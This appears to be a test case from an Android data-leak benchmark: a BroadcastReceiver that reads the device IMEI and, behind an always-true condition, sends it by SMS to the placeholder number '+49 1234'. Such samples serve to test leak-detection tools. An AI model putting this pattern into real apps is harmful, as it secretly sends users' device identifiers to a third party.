package de.ecspride;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;


public class TestReceiver extends BroadcastReceiver{

	@Override
	  public void onReceive(Context context, Intent intent) {
		 String imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		 int i = 2+3;
		 if(i == 5){
				SmsManager sms = SmsManager.getDefault();
		        sms.sendTextMessage("+49 1234", null, imei, null, null); 
		 }
	}

}

